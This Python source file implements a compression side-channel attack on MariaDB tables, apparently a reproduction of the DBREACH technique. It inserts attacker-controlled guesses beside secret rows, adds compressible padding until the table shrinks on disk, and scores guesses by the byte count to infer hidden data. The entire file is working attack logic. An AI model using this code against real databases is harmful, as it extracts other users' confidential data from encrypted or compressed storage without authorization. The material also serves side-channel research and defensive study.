import utils.mariadb_utils as utils
import dbreacher
import time
import random
import string

class DBREACHerImpl(dbreacher.DBREACHer):
    def __init__(self, controller: utils.MariaDBController, tablename: str, startIdx: int, maxRowSize: int, fillerCharSet: set, compressCharAscii: int):
        super().__init__(controller, tablename, startIdx, maxRowSize, fillerCharSet, compressCharAscii)
        self.compressibilityScoreReady = False
        self.bytesShrunkForCurrentGuess = 0
        self.rowsAdded = 0 
        self.rowsChanged = [False, False, False, False]
        self.fillersInserted = False
        self.compressChar = chr(compressCharAscii)
        
        print(f"Compress character initialized to: {self.compressChar}")

    def reinsertFillers(self) -> bool:
        self.compressibilityScoreReady = False
        if self.fillersInserted:
            print("Reinserting fillers...")
            for row in range(self.startIdx, self.rowsAdded + self.startIdx - (self.bytesShrunkForCurrentGuess // 100)):
                compressed_str = utils.get_compressible_str(200, char=self.compressChar)
                # print(f"Updating row {row} with compressible string.")
                self.control.update_row(self.table, row, compressed_str)
            for row in range(self.startIdx, self.rowsAdded + self.startIdx):
                # print(f"Deleting row {row}.")
                self.control.delete_row(self.table, row)
            
            self.bytesShrunkForCurrentGuess = 0
            self.fillers = [''.join(random.choices(self.fillerCharSet, k=self.maxRowSize)) for _ in range(self.numFillerRows)]
            print(f"Fillers list created with {len(self.fillers)} fillers.")
        else:
            print("Fillers not inserted yet. Skipping reinsertion.")

        return self.insertFillers()

    def insertFillers(self) -> bool:
        self.fillersInserted = True
        oldSize = self.control.get_table_size(self.table)
        print(f"Old table size: {oldSize} bytes")
        
        # filler 리스트가 비어있는지 확인
        if not self.fillers:
            print("Error: Fillers list is empty.")
            return False
        
        # insert first filler row for putting in guesses:
        self.control.insert_row(self.table, self.startIdx, self.fillers[0]) 
        self.rowsAdded = 1
        newSize = self.control.get_table_size(self.table)
        print(f"New table size after first insert: {newSize} bytes")

        if newSize > oldSize:
            # table grew too quickly, before we could insert all necessary fillers
            print("Table grew too quickly. Aborting filler insertion.")
            return False
        
        compression_bootstrapper = utils.get_compressible_str(100, char=self.compressChar)
        print(f"Compression bootstrapper: {compression_bootstrapper}")
        
        # insert shrinker rows:
        # insert filler rows until table grows:
        i = 1
        while newSize <= oldSize: 
            filler = self.fillers[i]
            filler_part = filler[100:]
            combined_str = compression_bootstrapper + filler_part
            self.control.insert_row(self.table, self.startIdx + i, combined_str)
            newSize = self.control.get_table_size(self.table)
            print(f"New table size after inserting row {self.startIdx + i}: {newSize} bytes")
            i += 1
            self.rowsAdded += 1
        self.rowsChanged = [False, False, False, False]
        print(f"Inserted {self.rowsAdded} filler rows successfully.")
        return True

    def insertGuessAndCheckIfShrunk(self, guess: str) -> bool:
        self.compressibilityScoreReady = False
        self.bytesShrunkForCurrentGuess = 0

        # reset first 3 rows to original state before inserting guess:
        if self.rowsChanged[0]:
            # print(f"Resetting row {self.startIdx} to original filler.")
            self.control.update_row(self.table, self.startIdx, self.fillers[0])
            self.rowsChanged[0] = False
        compression_bootstrapper = utils.get_compressible_str(100, char=self.compressChar)
        for i in range(1, 4):
            if self.rowsChanged[i]:
                # print(f"Resetting row {self.startIdx + self.rowsAdded - i} to original filler.")
                self.rowsChanged[i] = False
                row_to_reset = self.startIdx + self.rowsAdded - i
                filler = self.fillers[self.rowsAdded - i]
                reset_str = compression_bootstrapper + filler[100:]
                self.control.update_row(self.table, row_to_reset, reset_str)
        
        old_size = self.control.get_table_size(self.table)
        # print(f"Old table size before guess insertion: {old_size} bytes")
        new_first_row = guess + self.fillers[0][len(guess):]
        if new_first_row != self.fillers[0]:
            # print(f"Updating row {self.startIdx} with guess: {new_first_row}")
            self.control.update_row(self.table, self.startIdx, new_first_row)
            self.rowsChanged[0] = True
        new_size = self.control.get_table_size(self.table)
        # print(f"New table size after guess insertion: {new_size} bytes")
        return new_size < old_size

    def addCompressibleByteAndCheckIfShrunk(self) -> bool:
        old_size = self.control.get_table_size(self.table)
        self.bytesShrunkForCurrentGuess += 1
        if self.bytesShrunkForCurrentGuess <= 100: 
            self.rowsChanged[1] = True
            compress_str = utils.get_compressible_str(100 + self.bytesShrunkForCurrentGuess, char=self.compressChar)
            row_to_update = self.startIdx + self.rowsAdded - 1
            # print(f"Updating row {row_to_update} with: {compress_str}")
            self.control.update_row(self.table, row_to_update, compress_str + self.fillers[self.rowsAdded - 1][len(compress_str):]) 
        elif self.bytesShrunkForCurrentGuess <= 200: 
            self.rowsChanged[2] = True
            compress_str = utils.get_compressible_str(self.bytesShrunkForCurrentGuess, char=self.compressChar) 
            row_to_update = self.startIdx + self.rowsAdded - 2
            # print(f"Updating row {row_to_update} with: {compress_str}")
            self.control.update_row(self.table, row_to_update, compress_str + self.fillers[self.rowsAdded - 2][len(compress_str):])
        elif self.bytesShrunkForCurrentGuess <= 300:
            self.rowsChanged[3] = True
            compress_str = utils.get_compressible_str(self.bytesShrunkForCurrentGuess - 100, char=self.compressChar)
            row_to_update = self.startIdx + self.rowsAdded - 3
            # print(f"Updating row {row_to_update} with: {compress_str}")
            self.control.update_row(self.table, row_to_update, compress_str + self.fillers[self.rowsAdded - 3][len(compress_str):])
        else:
            print("Maximum compressible bytes reached.")
            raise RuntimeError()
            self.compressibilityScoreReady = True
            return True
        new_size = self.control.get_table_size(self.table)
        # print(f"New table size after compression byte addition: {new_size} bytes")

        if new_size < old_size:
            self.compressibilityScoreReady = True
            # print(f"Compression succeeded. Bytes shrunk: {self.bytesShrunkForCurrentGuess}")
            return True
        else:
            return False

    def getSNoReferenceScore(self, length: int, charSet) -> float:
        refGuess = ''.join(random.choices(charSet, k=length)) 
        print(f"Inserting reference guess (No) of length {length}: {refGuess}")
        shrunk = self.insertGuessAndCheckIfShrunk(refGuess)
        if shrunk:
            raise RuntimeError("Table shrunk too early on insertion of guess")
        while not shrunk:
            shrunk = self.addCompressibleByteAndCheckIfShrunk()
        return self.getBytesShrunkForCurrentGuess()

    def getSYesReferenceScore(self, length: int) -> float:
        refGuess = self.fillers[1][100:][:length]
        print(f"Inserting reference guess (Yes) of length {length}: {refGuess}")
        shrunk = self.insertGuessAndCheckIfShrunk(refGuess)
        if shrunk:
            raise RuntimeError("Table shrunk too early on insertion of guess")
        while not shrunk:
            shrunk = self.addCompressibleByteAndCheckIfShrunk()
        return self.getBytesShrunkForCurrentGuess()

    def getCompressibilityScoreOfCurrentGuess(self) -> float:
        if self.compressibilityScoreReady:
            return float(1) / float(self.bytesShrunkForCurrentGuess)
        else:
            return None

    def getBytesShrunkForCurrentGuess(self) -> int:
        if self.compressibilityScoreReady:
            return self.bytesShrunkForCurrentGuess
        else:
            return None
